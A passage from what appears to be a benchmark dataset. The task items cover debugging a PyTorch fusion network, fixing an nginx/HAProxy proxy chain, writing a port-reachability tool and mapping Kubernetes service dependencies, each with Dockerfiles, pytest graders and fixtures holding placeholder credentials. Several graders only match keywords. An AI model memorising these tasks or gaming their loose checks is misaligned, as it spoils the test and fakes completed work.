    assert result.stdout.strip().startswith('7'), f""Unexpected Rails version: {result.stdout.strip()}""","{""test_bundle_install_succeeds"": 0.7, ""test_rails_gem_loadable"": 0.3}","{""Gemfile"": ""source 'https://rubygems.org'\n\nruby '3.2.0'\n\ngem 'rails', '~> 7.0'\ngem 'puma', '~> 6.0'\ngem 'pg', '~> 1.5'\ngem 'bootsnap', require: false\n\ngroup :development, :test do\n  gem 'debug'\nend""}",2025-07-21T09:48:58.284102,2025-07-22T11:07:31.986065+00:00
draft_dp_f9aae7eb,medium,draft_dp_f9aae7eb,machine-learning,The multimodal fusion network is producing NaN values during training - audio features are ~0.001-0.01 scale while visual features are 10-100. Fix the cross-attention to handle these different scales properly.,machine-learning,pytorch|model-training|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

RUN pip install torch torchvision torchaudio numpy

COPY fusion_network.py /workspace/
COPY train.py /workspace/

CMD [""bash""]","import subprocess
import os

def test_training_stability():
    """"""Test that training completes without NaN losses""""""
    result = subprocess.run(
        ['python', '/workspace/train.py'],
        capture_output=True,
        text=True,
        timeout=30
    )
    
    assert result.returncode == 0, f""Training script failed with return code {result.returncode}""
    
    output_lines = result.stdout.strip().split('\n')
    
    # Check that training ran for all epochs without NaN
    assert ""NaN loss detected!"" not in result.stdout, ""Training produced NaN losses""
    
    # Verify we completed all 10 epochs
    epoch_count = sum(1 for line in output_lines if line.startswith(""Epoch""))
    assert epoch_count == 10, f""Expected 10 epochs, but only completed {epoch_count}""

def test_attention_weights_normalized():
    """"""Test that attention weights are properly normalized after fix""""""
    # Write a test script to avoid module-level imports
    test_script_path = '/tmp/test_attention.py'
    with open(test_script_path, 'w') as f:
        f.write(""""""
import torch
import sys
sys.path.append('/workspace')
from fusion_network import MultimodalFusionNetwork

model = MultimodalFusionNetwork()

# Test with extreme scale differences
audio = torch.randn(2, 16, 128) * 0.001  # Very small scale
visual = torch.randn(2, 16, 256) * 100   # Very large scale

output, attention_weights = model(audio, visual)

# Check attention weights are finite and normalized
assert torch.all(torch.isfinite(attention_weights)), ""Attention weights contain inf/nan""
assert torch.all(attention_weights >= 0), ""Attention weights have negative values""
assert torch.all(attention_weights <= 1), ""Attention weights exceed 1.0""

# Check each row sums to 1 (with small tolerance)
row_sums = attention_weights.sum(dim=-1)
assert torch.all(torch.abs(row_sums - 1.0) < 1e-5), ""Attention weights not properly normalized""

print(""SUCCESS"")
"""""")
    
    result = subprocess.run(
        ['python', test_script_path],
        capture_output=True,
        text=True
    )
    
    # Clean up
    if os.path.exists(test_script_path):
        os.unlink(test_script_path)
    
    assert result.returncode == 0, f""Test failed with error: {result.stderr}""
    assert ""SUCCESS"" in result.stdout, ""Attention weight test did not complete successfully""","{""test_training_stability"": 0.6, ""test_attention_weights_normalized"": 0.4}","{""train.py"": ""import torch\nimport torch.nn as nn\nimport numpy as np\nfrom fusion_network import MultimodalFusionNetwork\n\ndef generate_multimodal_data(batch_size=32):\n    # Generate synthetic audio features (small scale: 0.001-0.01)\n    audio_features = torch.randn(batch_size, 16, 128) * 0.005 + 0.003\n    \n    # Generate synthetic visual features (large scale: 10-100) \n    visual_features = torch.randn(batch_size, 16, 256) * 30 + 50\n    \n    # Random labels\n    labels = torch.randint(0, 10, (batch_size,))\n    \n    return audio_features, visual_features, labels\n\ndef train_model():\n    model = MultimodalFusionNetwork()\n    criterion = nn.CrossEntropyLoss()\n    optimizer = torch.optim.Adam(model.parameters(), lr=0.001)\n    \n    print(\""Starting training...\"")\n    for epoch in range(10):\n        audio, visual, labels = generate_multimodal_data()\n        \n        optimizer.zero_grad()\n        outputs, attention_weights = model(audio, visual)\n        loss = criterion(outputs, labels)\n        \n        print(f\""Epoch {epoch}: Loss = {loss.item():.4f}\"")\n        print(f\""Attention weights - Min: {attention_weights.min().item():.6f}, Max: {attention_weights.max().item():.6f}\"")\n        \n        if torch.isnan(loss):\n            print(\""NaN loss detected!\"")\n            break\n            \n        loss.backward()\n        optimizer.step()\n\nif __name__ == \""__main__\"":\n    train_model()"", ""fusion_network.py"": ""import torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nclass CrossModalAttention(nn.Module):\n    def __init__(self, audio_dim=128, visual_dim=256, hidden_dim=128):\n        super().__init__()\n        self.audio_proj = nn.Linear(audio_dim, hidden_dim)\n        self.visual_proj = nn.Linear(visual_dim, hidden_dim)\n        \n        self.query = nn.Linear(hidden_dim, hidden_dim)\n        self.key = nn.Linear(hidden_dim, hidden_dim)\n        self.value = nn.Linear(hidden_dim, hidden_dim)\n        \n        self.scale = hidden_dim ** 0.5\n        \n    def forward(self, audio_features, visual_features):\n        batch_size = audio_features.size(0)\n        \n        audio_hidden = self.audio_proj(audio_features)\n        visual_hidden = self.visual_proj(visual_features)\n        \n        Q = self.query(audio_hidden)\n        K = self.key(visual_hidden)\n        V = self.value(visual_hidden)\n        \n        attention_scores = torch.matmul(Q, K.transpose(-2, -1)) / self.scale\n        attention_weights = F.softmax(attention_scores, dim=-1)\n        \n        attended_features = torch.matmul(attention_weights, V)\n        \n        return attended_features, attention_weights\n\nclass MultimodalFusionNetwork(nn.Module):\n    def __init__(self, audio_dim=128, visual_dim=256, num_classes=10):\n        super().__init__()\n        self.cross_attention = CrossModalAttention(audio_dim, visual_dim)\n        self.fusion_layer = nn.Linear(256, 128)\n        self.classifier = nn.Linear(128, num_classes)\n        \n    def forward(self, audio_features, visual_features):\n        attended_features, attention_weights = self.cross_attention(audio_features, visual_features)\n        \n        fused = torch.cat([attended_features, audio_features], dim=-1)\n        fused = self.fusion_layer(fused)\n        output = self.classifier(fused)\n        \n        return output, attention_weights""}",2025-07-21T10:05:06.261156,2025-07-22T11:09:04.981241+00:00
draft_dp_4be7fbad,medium,draft_dp_4be7fbad,system-administration,The nginx -> HAProxy -> Flask app chain is returning 502 errors. Fix the proxy configs so requests to port 80 reach all three backends and return proper JSON responses.,system-administration,networking|web-server|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install required packages
RUN apt-get update && apt-get install -y \
    nginx \
    haproxy \
    python3-pip \
    python3-flask \
    python3-pytest \
    curl \
    net-tools \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy Flask applications
COPY app1.py /app/
COPY app2.py /app/
COPY app3.py /app/

# Copy configurations
COPY nginx.conf /etc/nginx/nginx.conf
COPY haproxy.cfg /etc/haproxy/haproxy.cfg

# Copy startup script
COPY start_services.sh /app/
RUN chmod +x /app/start_services.sh

# Start services
CMD [""/app/start_services.sh""]","import subprocess
import json
import time

def test_proxy_chain_returns_json():
    """"""Test that requests to nginx return JSON responses from backends""""""
    result = subprocess.run(
        ['curl', '-s', '-w', '\nHTTP_CODE:%{http_code}', 'http://localhost/'],
        capture_output=True,
        text=True,
        timeout=10
    )
    
    # Check HTTP status code
    lines = result.stdout.strip().split('\n')
    assert 'HTTP_CODE:200' in lines[-1], f""Expected 200, got {lines[-1]}""
    
    # Check JSON response
    json_response = '\n'.join(lines[:-1])
    data = json.loads(json_response)
    assert 'server' in data
    assert data['server'] in ['backend1', 'backend2', 'backend3']

def test_load_balancing_all_backends():
    """"""Test that requests are distributed across all three backends""""""
    backends_hit = set()
    
    # Make multiple requests to collect backend responses
    for _ in range(15):
        result = subprocess.run(
            ['curl', '-s', 'http://localhost/'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if 'server' in data:
                    backends_hit.add(data['server'])
            except:
                pass
        
        time.sleep(0.1)
    
    # Should have hit all three backends
    assert len(backends_hit) == 3, f""Only hit {len(backends_hit)} backends: {backends_hit}""","{""test_proxy_chain_returns_json"": 0.6, ""test_load_balancing_all_backends"": 0.4}","{""app3.py"": ""from flask import Flask, request, jsonify\nimport socket\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return jsonify({\n        'server': 'backend3',\n        'host': socket.gethostname(),\n        'headers': dict(request.headers)\n    })\n\n@app.route('/health')\ndef health():\n    return 'OK', 200\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5003)"", ""app2.py"": ""from flask import Flask, request, jsonify\nimport socket\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return jsonify({\n        'server': 'backend2',\n        'host': socket.gethostname(),\n        'headers': dict(request.headers)\n    })\n\n@app.route('/health')\ndef health():\n    return 'OK', 200\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5002)"", ""haproxy.cfg"": ""global\n    daemon\n\ndefaults\n    mode http\n    timeout connect 5000ms\n    timeout client 50000ms\n    timeout server 50000ms\n\nfrontend web_frontend\n    bind *:8080\n    default_backend web_servers\n\nbackend web_servers\n    balance roundrobin\n    option httpchk GET /health\n    server app1 127.0.0.1:5001 check\n    server app2 127.0.0.1:5002 check\n    server app3 127.0.0.1:5003 check"", ""app1.py"": ""from flask import Flask, request, jsonify\nimport socket\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return jsonify({\n        'server': 'backend1',\n        'host': socket.gethostname(),\n        'headers': dict(request.headers)\n    })\n\n@app.route('/health')\ndef health():\n    return 'OK', 200\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5001)"", ""nginx.conf"": ""events {\n    worker_connections 1024;\n}\n\nhttp {\n    upstream backend {\n        server 127.0.0.1:8080;\n    }\n\n    server {\n        listen 80;\n        \n        location / {\n            proxy_pass http://backend;\n            proxy_set_header Host $host;\n            proxy_connect_timeout 2s;\n            proxy_read_timeout 2s;\n        }\n    }\n}"", ""start_services.sh"": ""#!/bin/bash\n\n# Start Flask backends\npython3 /app/app1.py &\npython3 /app/app2.py &\npython3 /app/app3.py &\n\n# Give Flask apps time to start\nsleep 2\n\n# Start HAProxy\nhaproxy -f /etc/haproxy/haproxy.cfg &\n\n# Start nginx\nnginx -c /etc/nginx/nginx.conf\n\n# Keep container running\ntail -f /dev/null""}",2025-07-21T10:03:40.325025,2025-07-22T11:09:44.445205+00:00
draft_dp_94613753,hard,draft_dp_94613753,system-administration,Some of our services are unreachable. Write a tool to discover which services can connect to which others on their respective ports.,system-administration,networking|python|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install network tools
RUN apt-get update && apt-get install -y \
    netcat-traditional \
    && rm -rf /var/lib/apt/lists/*

# Copy project files
COPY network_discovery.py /app/
COPY services.json /app/
COPY mock_services.py /app/

# Make scripts executable
RUN chmod +x /app/network_discovery.py /app/mock_services.py

# Start mock services in background on container start
RUN echo '#!/bin/bash\npython3 /app/mock_services.py &\nexec ""$@""' > /entrypoint.sh && \
    chmod +x /entrypoint.sh

ENTRYPOINT [""/entrypoint.sh""]
CMD [""/bin/bash""]","import subprocess
import json
import os

def test_discovers_running_services():
    """"""Test that the tool correctly identifies which services are running.""""""
    # Run the network discovery tool
    result = subprocess.run(['python3', '/app/network_discovery.py'], 
                          capture_output=True, text=True)
    
    assert result.returncode == 0, ""Network discovery tool should run successfully""
    
    output = result.stdout.lower()
    
    # Check that running services are identified
    assert ""web"" in output and (""running"" in output or ""reachable"" in output or ""up"" in output or ""ok"" in output)
    assert ""api"" in output and (""running"" in output or ""reachable"" in output or ""up"" in output or ""ok"" in output)
    assert ""cache"" in output and (""running"" in output or ""reachable"" in output or ""up"" in output or ""ok"" in output)

def test_identifies_down_services():
    """"""Test that the tool correctly identifies services that are down.""""""
    # Run the network discovery tool
    result = subprocess.run(['python3', '/app/network_discovery.py'], 
                          capture_output=True, text=True)
    
    assert result.returncode == 0, ""Network discovery tool should run successfully""
    
    output = result.stdout.lower()
    
    # Check that the db service is identified as down
    assert ""db"" in output and (""down"" in output or ""unreachable"" in output or ""failed"" in output or ""cannot connect"" in output)","{""test_discovers_running_services"": 0.6, ""test_identifies_down_services"": 0.4}","{""network_discovery.py"": ""#!/usr/bin/env python3\n\nimport subprocess\nimport json\nimport socket\n\ndef check_service_connection(host, port, timeout=2):\n    \""\""\""Check if a service is reachable on given host:port\""\""\""\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(timeout)\n    result = sock.connect_ex((host, port))\n    sock.close()\n    return result == 0\n\ndef main():\n    print(\""Network Discovery Tool\"")\n    print(\""=\"" * 50)\n    \n    # Load services configuration\n    with open('/app/services.json', 'r') as f:\n        config = json.load(f)\n    \n    services = config['services']\n    \n    for service_name, service_info in services.items():\n        host = service_info['host']\n        port = service_info['port']\n        \n        is_up = check_service_connection(host, port)\n        \n        print(f\""{service_name}: {host}:{port}\"")\n    \nif __name__ == \""__main__\"":\n    main()"", ""mock_services.py"": ""#!/usr/bin/env python3\n\nimport socket\nimport threading\nimport sys\n\n# Services setup - some will be running, some won't\ndef start_service(name, port):\n    try:\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server.bind(('localhost', port))\n        server.listen(1)\n        print(f\""Started {name} on port {port}\"")\n        \n        while True:\n            conn, addr = server.accept()\n            conn.send(f\""{name} OK\\n\"".encode())\n            conn.close()\n    except Exception as e:\n        print(f\""Failed to start {name}: {e}\"")\n\n# Start only some services (simulating partial outage)\nservices_to_start = [\n    ('web', 8080),\n    ('api', 8081),\n    # db is down\n    ('cache', 6379)\n]\n\nfor name, port in services_to_start:\n    t = threading.Thread(target=start_service, args=(name, port))\n    t.daemon = True\n    t.start()\n\n# Keep running\ntry:\n    while True:\n        pass\nexcept KeyboardInterrupt:\n    sys.exit(0)"", ""services.json"": ""{\n    \""services\"": {\n        \""web\"": {\""host\"": \""localhost\"", \""port\"": 8080},\n        \""api\"": {\""host\"": \""localhost\"", \""port\"": 8081},\n        \""db\"": {\""host\"": \""localhost\"", \""port\"": 5432},\n        \""cache\"": {\""host\"": \""localhost\"", \""port\"": 6379}\n    }\n}""}",2025-07-21T11:11:58.864913,2025-07-22T11:30:39.429428+00:00
draft_dp_886e484e,hard,draft_dp_886e484e,system-administration,"The microservices in this cluster have grown organically and we've lost track of how everything connects. Map out all the services, their dependencies, and create a topology visualization showing how they communicate.",system-administration,cloud|networking|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    curl \
    wget \
    ca-certificates \
    python3 \
    python3-pip \
    python3-pytest \
    python3-yaml \
    iptables \
    iproute2 \
    && rm -rf /var/lib/apt/lists/*

# Make python3 the default python
RUN ln -s /usr/bin/python3 /usr/bin/python

# Download k3s binary directly
RUN curl -L https://github.com/k3s-io/k3s/releases/download/v1.28.2%2Bk3s1/k3s -o /usr/local/bin/k3s && \
    chmod +x /usr/local/bin/k3s

# Create necessary directories
RUN mkdir -p /var/lib/rancher/k3s/server/manifests /etc/rancher/k3s

ENV KUBECONFIG=/etc/rancher/k3s/k3s.yaml
ENV PATH=""${PATH}:/usr/local/bin""

WORKDIR /workspace

# Copy all manifest files
COPY namespaces.yaml /k8s-manifests/
COPY api-gateway.yaml /k8s-manifests/
COPY user-service.yaml /k8s-manifests/
COPY auth-service.yaml /k8s-manifests/
COPY order-service.yaml /k8s-manifests/
COPY inventory-service.yaml /k8s-manifests/
COPY payment-service.yaml /k8s-manifests/
COPY notification-service.yaml /k8s-manifests/
COPY analytics-service.yaml /k8s-manifests/
COPY infrastructure.yaml /k8s-manifests/
COPY network-policies.yaml /k8s-manifests/
COPY setup-k8s.sh /usr/local/bin/

RUN chmod +x /usr/local/bin/setup-k8s.sh

# Create startup script
RUN echo '#!/bin/bash\n\
k3s server --disable traefik --disable servicelb &\n\
sleep 30\n\
setup-k8s.sh\n\
tail -f /dev/null' > /usr/local/bin/start.sh && \
chmod +x /usr/local/bin/start.sh

CMD [""/usr/local/bin/start.sh""]","import os
import json
import subprocess
import re

def test_all_services_discovered():
    """"""Test that all deployed services are discovered and documented.""""""
    expected_services = {
        'production': ['api-gateway', 'user-service', 'auth-service'],
        'backend': ['order-service', 'inventory-service', 'payment-service', 'notification-service', 'analytics-service'],
        'infrastructure': ['postgres', 'mongodb', 'redis', 'rabbitmq']
    }
    
    # Check for common discovery output files
    possible_files = [
        '/workspace/service_topology.json',
        '/workspace/services_discovered.json',
        '/workspace/topology.json',
        '/workspace/service_map.json',
        '/workspace/microservices_topology.json'
    ]
    
    topology_found = False
    for file_path in possible_files:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                try:
                    data = json.load(f)
                    # Check if all services are present in the JSON
                    services_in_data = set()
                    
                    # Handle different JSON structures
                    if isinstance(data, dict):
                        # Check for services in various possible keys
                        for key in ['services', 'nodes', 'microservices', 'topology']:
                            if key in data:
                                if isinstance(data[key], list):
                                    for svc in data[key]:
                                        if isinstance(svc, dict) and 'name' in svc:
                                            services_in_data.add(svc['name'])
                                elif isinstance(data[key], dict):
                                    services_in_data.update(data[key].keys())
                    
                    # Also check if services are listed at root level
                    for namespace, services in expected_services.items():
                        for service in services:
                            if service in str(data):
                                services_in_data.add(service)
                    
                    # Verify all expected services are found
                    all_expected = set()
                    for services in expected_services.values():
                        all_expected.update(services)
                    
                    if all_expected.issubset(services_in_data):
                        topology_found = True
                        break
                except:
                    pass
    
    assert topology_found, ""No valid topology file found with all expected services""

def test_topology_visualization_created():
    """"""Test that a valid topology visualization is generated.""""""
    visualization_files = [
        '/workspace/topology.dot',
        '/workspace/service_topology.dot',
        '/workspace/topology.md',
        '/workspace/service_map.md',
        '/workspace/topology_diagram.dot',
        '/workspace/topology.mermaid',
        '/workspace/service_topology.mermaid'
    ]
    
    visualization_found = False
    
    # Check for DOT files
    for file_path in visualization_files:
        if os.path.exists(file_path):
            if file_path.endswith('.dot'):
                # Validate DOT format
                with open(file_path, 'r') as f:
                    content = f.read()
                    if 'digraph' in content or 'graph' in content:
                        if '->' in content or '--' in content:  # Has edges
                            visualization_found = True
                            break
            elif file_path.endswith('.mermaid') or file_path.endswith('.md'):
                # Check for Mermaid diagram
                with open(file_path, 'r') as f:
                    content = f.read()
                    if 'graph' in content or 'flowchart' in content:
                        if '-->' in content or '---' in content:  # Has connections
                            visualization_found = True
                            break
    
    # Also check if visualization is embedded in JSON
    if not visualization_found:
        json_files = [f for f in os.listdir('/workspace') if f.endswith('.json')]
        for json_file in json_files:
            try:
                with open(f'/workspace/{json_file}', 'r') as f:
                    data = json.load(f)
                    if isinstance(data, dict):
                        # Check for edges/connections in JSON format
                        if 'edges' in data or 'connections' in data or 'dependencies' in data:
                            visualization_found = True
                            break
            except:
                pass
    
    assert visualization_found, ""No valid topology visualization found (DOT, Mermaid, or JSON with edges)""

def test_service_dependencies_mapped():
    """"""Test that service dependencies and communication patterns are correctly identified.""""""
    # Expected key dependencies
    expected_dependencies = [
        ('api-gateway', 'user-service'),
        ('api-gateway', 'order-service'),
        ('user-service', 'postgres'),
        ('user-service', 'redis'),
        ('user-service', 'auth-service'),
        ('order-service', 'postgres'),
        ('order-service', 'payment-service'),
        ('order-service', 'inventory-service'),
        ('order-service', 'rabbitmq'),
        ('payment-service', 'notification-service'),
        ('payment-service', 'rabbitmq'),
        ('inventory-service', 'mongodb'),
        ('analytics-service', 'rabbitmq'),
        ('analytics-service', 'mongodb')
    ]
    
    dependencies_found = set()
    
    # Check all potential output files
    for file_name in os.listdir('/workspace'):
        file_path = f'/workspace/{file_name}'
        if os.path.isfile(file_path):
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                    
                    # Look for dependencies in various formats
                    for source, target in expected_dependencies:
                        # Check different connection representations
                        patterns = [
                            f'{source}.*->.*{target}',
                            f'{source}.*-->.*{target}',
                            f'""{source}"".*->.*""{target}""',
                            f'{source}.*connects.*{target}',
                            f'{source}.*depends.*{target}',
                            f'""source"".*{source}.*""target"".*{target}',
                            f'""from"".*{source}.*""to"".*{target}'
                        ]
                        
                        for pattern in patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                dependencies_found.add((source, target))
                                break
            except:
                pass
    
    # We need at least 8 of the expected dependencies to be found
    assert len(dependencies_found) >= 8, f""Insufficient dependencies mapped. Found {len(dependencies_found)}, expected at least 8""","{""test_all_services_discovered"": 0.35, ""test_topology_visualization_created"": 0.3, ""test_service_dependencies_mapped"": 0.35}","{""analytics-service.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: analytics-service\n  namespace: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: analytics-service\n  template:\n    metadata:\n      labels:\n        app: analytics-service\n        tier: backend\n    spec:\n      containers:\n      - name: analytics-service\n        image: nginx:alpine\n        ports:\n        - containerPort: 8084\n        env:\n        - name: RABBITMQ_HOST\n          value: \""rabbitmq.infrastructure.svc.cluster.local\""\n        - name: RABBITMQ_PORT\n          value: \""5672\""\n        - name: CONSUME_QUEUES\n          value: \""orders,payment-events\""\n        - name: MONGODB_URL\n          value: \""mongodb://mongodb.infrastructure.svc.cluster.local:27017/analytics\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: analytics-service\n  namespace: backend\nspec:\n  selector:\n    app: analytics-service\n  ports:\n  - port: 8084\n    targetPort: 8084\n  type: ClusterIP"", ""auth-service.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: auth-service\n  namespace: production\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: auth-service\n  template:\n    metadata:\n      labels:\n        app: auth-service\n        tier: backend\n    spec:\n      containers:\n      - name: auth-service\n        image: nginx:alpine\n        ports:\n        - containerPort: 8082\n        env:\n        - name: JWT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: auth-secrets\n              key: jwt-secret\n        - name: DATABASE_URL\n          value: \""postgres://postgres.infrastructure.svc.cluster.local:5432/auth\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: auth-service\n  namespace: production\nspec:\n  selector:\n    app: auth-service\n  ports:\n  - port: 8082\n    targetPort: 8082\n  type: ClusterIP\n---\napiVersion: v1\nkind: Secret\nmetadata:\n  name: auth-secrets\n  namespace: production\ntype: Opaque\ndata:\n  jwt-secret: c3VwZXJzZWNyZXRrZXk="", ""api-gateway.yaml"": ""apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: api-gateway-config\n  namespace: production\ndata:\n  config.yaml: |\n    server:\n      port: 8080\n    upstream_services:\n      - name: user-service\n        url: http://user-service.production.svc.cluster.local:8080\n        protocol: http\n      - name: order-service\n        url: http://order-service.backend.svc.cluster.local:8081\n        protocol: http\n      - name: inventory-service\n        url: inventory-service.backend.svc.cluster.local:50051\n        protocol: grpc\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-gateway\n  namespace: production\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: api-gateway\n  template:\n    metadata:\n      labels:\n        app: api-gateway\n        tier: frontend\n    spec:\n      containers:\n      - name: api-gateway\n        image: nginx:alpine\n        ports:\n        - containerPort: 8080\n        env:\n        - name: BACKEND_TIMEOUT\n          value: \""30s\""\n        - name: MAX_CONNECTIONS\n          value: \""1000\""\n        volumeMounts:\n        - name: config\n          mountPath: /etc/api-gateway\n      volumes:\n      - name: config\n        configMap:\n          name: api-gateway-config\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: api-gateway\n  namespace: production\nspec:\n  selector:\n    app: api-gateway\n  ports:\n  - port: 8080\n    targetPort: 8080\n  type: ClusterIP"", ""network-policies.yaml"": ""apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: backend-isolation\n  namespace: backend\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: production\n    - namespaceSelector:\n        matchLabels:\n          name: backend\n  egress:\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: infrastructure\n    - namespaceSelector:\n        matchLabels:\n          name: backend\n  - to:\n    - podSelector: {}\n    ports:\n    - protocol: TCP\n      port: 53\n---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: infrastructure-isolation\n  namespace: infrastructure\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: production\n    - namespaceSelector:\n        matchLabels:\n          name: backend"", ""order-service.yaml"": ""apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: order-service-config\n  namespace: backend\ndata:\n  service.properties: |\n    message.broker.host=rabbitmq.infrastructure.svc.cluster.local\n    message.broker.port=5672\n    message.broker.exchange=orders\n    inventory.grpc.host=inventory-service.backend.svc.cluster.local\n    inventory.grpc.port=50051\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-service\n  namespace: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n        tier: backend\n    spec:\n      containers:\n      - name: order-service\n        image: nginx:alpine\n        ports:\n        - containerPort: 8081\n        env:\n        - name: DATABASE_HOST\n          value: \""postgres.infrastructure.svc.cluster.local\""\n        - name: DATABASE_NAME\n          value: \""orders\""\n        - name: PAYMENT_SERVICE_URL\n          value: \""http://payment-service.backend.svc.cluster.local:8083\""\n        volumeMounts:\n        - name: config\n          mountPath: /app/config\n      volumes:\n      - name: config\n        configMap:\n          name: order-service-config\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: order-service\n  namespace: backend\nspec:\n  selector:\n    app: order-service\n  ports:\n  - port: 8081\n    targetPort: 8081\n  type: ClusterIP"", ""notification-service.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notification-service\n  namespace: backend\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: notification-service\n  template:\n    metadata:\n      labels:\n        app: notification-service\n        tier: backend\n        protocol: grpc\n    spec:\n      containers:\n      - name: notification-service\n        image: nginx:alpine\n        ports:\n        - containerPort: 50052\n          name: grpc\n        env:\n        - name: GRPC_PORT\n          value: \""50052\""\n        - name: RABBITMQ_CONNECTION\n          value: \""amqp://rabbitmq.infrastructure.svc.cluster.local:5672\""\n        - name: EMAIL_QUEUE\n          value: \""email-notifications\""\n        - name: SMS_QUEUE\n          value: \""sms-notifications\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: notification-service\n  namespace: backend\n  annotations:\n    service.protocol: grpc\nspec:\n  selector:\n    app: notification-service\n  ports:\n  - port: 50052\n    targetPort: 50052\n    name: grpc\n  type: ClusterIP"", ""payment-service.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: payment-service\n  namespace: backend\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: payment-service\n  template:\n    metadata:\n      labels:\n        app: payment-service\n        tier: backend\n    spec:\n      containers:\n      - name: payment-service\n        image: nginx:alpine\n        ports:\n        - containerPort: 8083\n        env:\n        - name: DATABASE_URL\n          value: \""postgresql://postgres.infrastructure.svc.cluster.local:5432/payments\""\n        - name: RABBITMQ_HOST\n          value: \""rabbitmq.infrastructure.svc.cluster.local\""\n        - name: RABBITMQ_QUEUE\n          value: \""payment-events\""\n        - name: NOTIFICATION_SERVICE_URL\n          value: \""notification-service.backend.svc.cluster.local:50052\""\n        - name: NOTIFICATION_PROTOCOL\n          value: \""grpc\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: payment-service\n  namespace: backend\nspec:\n  selector:\n    app: payment-service\n  ports:\n  - port: 8083\n    targetPort: 8083\n  type: ClusterIP"", ""namespaces.yaml"": ""apiVersion: v1\nkind: Namespace\nmetadata:\n  name: production\n---\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: backend\n---\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: infrastructure"", ""inventory-service.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: inventory-service\n  namespace: backend\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: inventory-service\n  template:\n    metadata:\n      labels:\n        app: inventory-service\n        tier: backend\n        protocol: grpc\n    spec:\n      containers:\n      - name: inventory-service\n        image: nginx:alpine\n        ports:\n        - containerPort: 50051\n          name: grpc\n        env:\n        - name: SERVICE_PORT\n          value: \""50051\""\n        - name: DATABASE_CONNECTION\n          value: \""mongodb://mongodb.infrastructure.svc.cluster.local:27017/inventory\""\n        - name: CACHE_ENABLED\n          value: \""true\""\n        - name: REDIS_URL\n          value: \""redis://redis.infrastructure.svc.cluster.local:6379\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: inventory-service\n  namespace: backend\n  annotations:\n    service.protocol: grpc\nspec:\n  selector:\n    app: inventory-service\n  ports:\n  - port: 50051\n    targetPort: 50051\n    name: grpc\n  type: ClusterIP"", ""infrastructure.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\n  namespace: infrastructure\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n        tier: database\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:13-alpine\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_PASSWORD\n          value: \""postgres123\""\n        - name: POSTGRES_DB\n          value: \""main\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: postgres\n  namespace: infrastructure\nspec:\n  selector:\n    app: postgres\n  ports:\n  - port: 5432\n    targetPort: 5432\n  type: ClusterIP\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb\n  namespace: infrastructure\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: mongodb\n  template:\n    metadata:\n      labels:\n        app: mongodb\n        tier: database\n    spec:\n      containers:\n      - name: mongodb\n        image: mongo:4.4-focal\n 